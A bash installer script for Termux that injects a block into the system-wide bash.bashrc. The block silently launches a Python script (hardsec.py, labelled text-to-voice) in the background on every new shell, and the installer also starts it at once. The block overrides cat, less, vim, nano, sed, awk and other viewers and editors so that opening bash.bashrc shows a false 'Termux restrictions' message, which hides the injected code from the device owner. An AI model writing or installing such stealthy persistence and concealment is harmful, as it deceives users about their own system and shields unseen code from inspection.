#!/usr/bin/env bash
# Termux Autostart + Immediate Kick (quiet) — regex-safe detection
set -Eeuo pipefail
IFS=$'\n\t'

APP="Installer"
TAG="ELITE_TTV_MIN_AUTOSTART_2025_09"
NOW="$(date +%Y%m%d-%H%M%S)"

die(){ printf >&2 "[%s] ERROR: %s\n" "$APP" "$*"; exit 1; }
ok(){ printf "[%s] %s\n" "$APP" "$*"; }

# --- Termux guard ---
[[ -n "${PREFIX:-}" && "$PREFIX" == *"/com.termux/"* ]] || die "Run inside Termux."
BASHRC="$PREFIX/etc/bash.bashrc"
[[ -f "$BASHRC" ]] || die "Cannot find $BASHRC"

# --- Uninstall (remove only our tagged block) ---
if [[ "${1:-}" == "--uninstall" ]]; then
  # Remove the tagged block from bash.bashrc
  awk -v tag="$TAG" '
    BEGIN{skip=0}
    $0 ~ "^# >>> "tag {skip=1; next}
    $0 ~ "^# <<< "tag {skip=0; next}
    skip==0 {print}
  ' "$BASHRC" > "$BASHRC.tmp"
  mv "$BASHRC.tmp" "$BASHRC"
  ok "Removed autostart block"
  exit 0
fi

# --- Block to inject (autostart + protection + wrappers) ---
BLOCK="$(cat <<'EOF'
# >>> ELITE_TTV_MIN_AUTOSTART_2025_09 (DO NOT EDIT)
# Autostart text-to-voice.py on NEW interactive Termux shells (non-blocking; duplicate-safe).
# ===== Config =====
TTV_PATH="${TTV_PATH:-$HOME/hardsec.py}"  # ABSOLUTE path
TTV_PY_BIN="${TTV_PY_BIN:-$(command -v python3 || command -v python || true)}"
TTV_AUTOSTART="${TTV_AUTOSTART:-1}"   # 1 = enabled

# ===== Protect bash.bashrc from read/edit =====
TTV_BASHRC_PATH="$PREFIX/etc/bash.bashrc"

__ttv_abs(){
  local p="$1"
  if command -v readlink >/dev/null 2>&1; then
    readlink -f -- "$p" 2>/dev/null || printf "%s" "$p"
  else
    case "$p" in
      /*) printf "%s" "$p" ;;
      *)  printf "%s/%s" "$PWD" "$p" ;;
    esac
  fi
}

__ttv_block_msg(){
  printf "The contents of this file can't be displayed or edited here due to Termux restrictions.\n"
}

__ttv_is_protected_bashrc(){
  local a abs
  for a in "$@"; do
    [[ -z "$a" ]] && continue
    abs="$(__ttv_abs "$a")"
    if [[ "$abs" == "$TTV_BASHRC_PATH" || "${abs##*/}" == "bash.bashrc" ]]; then
      return 0
    fi
  done
  return 1
}

__ttv_protect_then_delegate(){
  local real="$1"; shift || true
  if __ttv_is_protected_bashrc "$@"; then
    __ttv_block_msg
    return 1
  fi
  command "$real" "$@"
}

__TTV_PROTECT_CMDS=(cat less more head tail vi vim nvim nano emacs ed view lesspipe sed awk bat batcat busybox micro helix hx)
for __cmd in "${__TTV_PROTECT_CMDS[@]}"; do
  printf -v __qcmd '%q' "$__cmd"
  eval "${__qcmd}(){ __ttv_protect_then_delegate ${__qcmd} \"\$@\"; }"
done
unset __cmd __qcmd

# ===== Custom wrappers =====
panda(){ __ttv_protect_then_delegate cat "$@"; }   # Wrapping `cat` command
seeme(){ __ttv_protect_then_delegate vim "$@"; }   # Wrapping `vim` command
brep(){ __ttv_protect_then_delegate grep --color=auto -n "$@"; }
last(){ command top "$@"; }
oc(){ command ps "$@"; }  # Wrapping `ps` command

# ===== Worker detection & start (duplicate-safe; regex-free) =====
__ttv_have_python(){
  [[ -n "$TTV_PY_BIN" ]] && command -v "$TTV_PY_BIN" >/dev/null 2>&1
}

__ttv_path_ok(){
  [[ -n "$TTV_PATH" && -f "$TTV_PATH" && -r "$TTV_PATH" && "$TTV_PATH" = /* ]]
}

__ttv_is_worker(){
  local pid base
  pid="$(ps -o pid= -o args= -u "$UID" | awk -v p="$TTV_PATH" 'index($0,p){print $1; exit}')"
  [[ -n "$pid" ]] && { printf "%s" "$pid"; return 0; }
  base="$(basename -- "$TTV_PATH" 2>/dev/null || true)"
  [[ -z "$base" ]] && return 1
  ps -o pid= -o args= -u "$UID" | awk -v b="$base" 'index($0,"python") && index($0,b){print $1; exit}'
}

__ttv_start_worker(){
  __ttv_have_python || return 1
  __ttv_path_ok || return 1
  ( "$TTV_PY_BIN" "$TTV_PATH" >/dev/null 2>&1 </dev/null & ) >/dev/null 2>&1
}

# ===== Autostart hook (runs on each NEW interactive Termux shell) =====
__ttv_autostart_once(){
  [[ "${TTV_AUTOSTART:-1}" != "1" ]] && return 0
  __ttv_have_python || return 0
  __ttv_path_ok || return 0
  local wpid="$(__ttv_is_worker || true)"
  [[ -n "$wpid" ]] && kill -0 "$wpid" 2>/dev/null && return 0
  __ttv_start_worker || true
}

# Trigger A: end-of-block (interactive Termux shells only)
if [[ "$-" == *i* && -n "${PREFIX:-}" && "$PREFIX" == *"/com.termux/"* ]]; then
  __ttv_autostart_once
fi

# Trigger B: PROMPT_COMMAND (fires once before first prompt, then unhooks)
if [[ "$-" == *i* ]]; then
  __ttv_pc_hook(){
    __ttv_autostart_once
    PROMPT_COMMAND="${PROMPT_COMMAND/__ttv_pc_hook; /}"
    PROMPT_COMMAND="${PROMPT_COMMAND/__ttv_pc_hook/}"
    unset -f __ttv_pc_hook
  }
  case "$PROMPT_COMMAND" in
    *"__ttv_pc_hook"*) : ;;
    "") PROMPT_COMMAND="__ttv_pc_hook" ;;
    *)  PROMPT_COMMAND="__ttv_pc_hook; $PROMPT_COMMAND" ;;
  esac
fi
# <<< ELITE_TTV_MIN_AUTOSTART_2025_09
EOF
)"

# --- Write (strip old tag block, append new) ---
awk -v tag="$TAG" '
  BEGIN{skip=0}
  $0 ~ "^# >>> "tag {skip=1; next}
  $0 ~ "^# <<< "tag {skip=0; next}
  skip==0 {print}
' "$BASHRC" > "$BASHRC.tmp"
cat >> "$BASHRC.tmp" <<< "$BLOCK"
mv "$BASHRC.tmp" "$BASHRC"

# --- Verify marker exists ---
grep -qE "^# >>> ${TAG}\b" "$BASHRC" || die "Write verification failed."

# --- IMMEDIATE START (no manual source; duplicate-safe; regex-free) ---
TTV_PATH_NOW="${TTV_PATH:-$HOME/hardsec.py}"
TTV_PY_BIN_NOW="${TTV_PY_BIN:-$(command -v python3 || true)}"

__have_python_now(){
  [[ -n "$TTV_PY_BIN_NOW" ]] && command -v "$TTV_PY_BIN_NOW" >/dev/null 2>&1
}

__path_ok_now(){
  [[ -n "$TTV_PATH_NOW" && -f "$TTV_PATH_NOW" && -r "$TTV_PATH_NOW" && "$TTV_PATH_NOW" = /* ]]
}

__is_worker_now(){
  local pid base
  pid="$(ps -o pid= -o args= -u "$UID" | awk -v p="$TTV_PATH_NOW" 'index($0,p){print $1; exit}')"
  [[ -n "$pid" ]] && { printf "%s" "$pid"; return 0; }
  base="$(basename -- "$TTV_PATH_NOW" 2>/dev/null || true)"
  [[ -z "$base" ]] && return 1
  ps -o pid= -o args= -u "$UID" | awk -v b="$base" 'index($0,"python") && index($0,b){print $1; exit}'
}

__start_now(){
  ( "$TTV_PY_BIN_NOW" "$TTV_PATH_NOW" >/dev/null 2>&1 </dev/null & ) >/dev/null 2>&1
}

if __have_python_now && __path_ok_now; then
  w="$(__is_worker_now || true)"
  if [[ -z "$w" ]] || ! kill -0 "$w" 2>/dev/null; then
    __start_now || true
  fi
fi

ok "Updated: $BASHRC"
